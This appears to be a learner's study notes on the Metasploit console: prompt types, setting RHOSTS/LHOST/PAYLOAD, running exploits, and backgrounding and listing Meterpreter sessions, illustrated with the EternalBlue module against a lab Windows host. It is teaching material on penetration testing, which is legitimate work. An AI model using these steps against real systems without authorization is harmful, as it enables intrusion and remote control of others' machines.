                                WORKING WITH MODULES.
                            ============================
- Once you have entered the context of a module using the use command followed by the module name, as seen earlier, you will need to set parameters.
- You can see the required parameters by running show options, and you can set parameters using:
    EG.
        set PARAMETER_NAME VALUE


                    METASPLOIT PROMPTS.
                ---------------------------
1. The regular command prompt: 
    - You can not use Metasploit commands here.
    - Basic system command prompt.
        EG.          
            root@ip-10-10-XX-XX:~#
        
2. The msfconsole prompt: 
    - msf6 (or msf5 depending on your installed version) is the msfconsole prompt.
    - As you can see, no context is set here, so context-specific commands to set parameters and run modules can not be used here.
        EG.
            msf6 >      

3. A context prompt:
    - Once you have decided to use a module and used the set command to chose it, the msfconsole will show the context. You can use context-specific commands (e.g. set RHOSTS 10.10.x.x) here.
        EG.
            msf6 exploit(windows/smb/ms17_010_eternalblue) >

4. The Meterpreter prompt:
    - Meterpreter is an important payload we will see in detail later in this module.
    - This means a Meterpreter agent was loaded to the target system and connected back to you.
    - You can use Meterpreter specific commands here.
        EG.           
            meterpreter >
    
5. A shell on the target system:
    - Once the exploit is completed, you may have access to a command shell on the target system.
    - This is a regular command line, and all commands typed here run on the target system.
        EG.
            C:\Windows\system32>


                        COMMON PARAMETERS.
                    -------------------------
> RHOSTS:
    - Remote target system's IP address or range.

> RPORT:
    - The port on the target system.

> LHOST:
    - IP address of the attacker's machine.

> LPORT:
    - Port on the attacker's machine for the reverse shell.

> PAYLOAD:
    - Payload to be used with the exploit.

> SESSION: 
    - Each connection established to the target system using Metasploit will have a session ID.
    - You will use this with post-exploitation modules that will connect to the target system using an existing connection.


    EG.
        # Set RHOSTS (You can check if the parameter has been set correctly using show options.)
        set RHOSTS 10.10.165.39

        # global parameter with setg (Use setg to set parameters globally across different modules:)
        setg RHOSTS 10.10.165.39

        # Unset parameter.
        unset PARAMETER_NAME
        unset all


                    RUNNING AN EXPLOIT.
                ------------------------
- Once parameters are configured, use exploit or run to execute the module.
    EG.
        exploit

- You can also run the exploit in the background using:
    EG.
        exploit -z


                                SESSIONS.
                            ---------------
- Once a vulnerability has been successfully exploited, a session will be created.
- This is the communication channel established between the target system and Metasploit.

1. Background a Session.   
    - You can use the background command to background the session prompt and go back to the msfconsole prompt.
        EG.          
            meterpreter > background
            [*] Backgrounding session 2...
            msf6 exploit(windows/smb/ms17_010_eternalblue) > 
                
                - Alternatively, CTRL+Z can be used to background sessions.

2. List sessions.    
    - The sessions command can be used from the msfconsole prompt or any context to see the existing sessions.
        EG. 
            msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions

            Active sessions
            ===============

            Id  Name  Type                     Information                   Connection
            --  ----  ----                     -----------                   ----------
            1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
            2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

            msf6 exploit(windows/smb/ms17_010_eternalblue) > 

3. Interact with a session. 
    - To interact with any session, you can use the sessions -i command followed by the desired session number.
        EG.
            msf6 > sessions

            Active sessions
            ===============

            Id  Name  Type                     Information                   Connection
            --  ----  ----                     -----------                   ----------
            1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49163 (10.10.12.229)
            2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.44.70:4444 -> 10.10.12.229:49186 (10.10.12.229)

            msf6 > sessions -i 2
            [*] Starting interaction with 2...

            meterpreter >

            

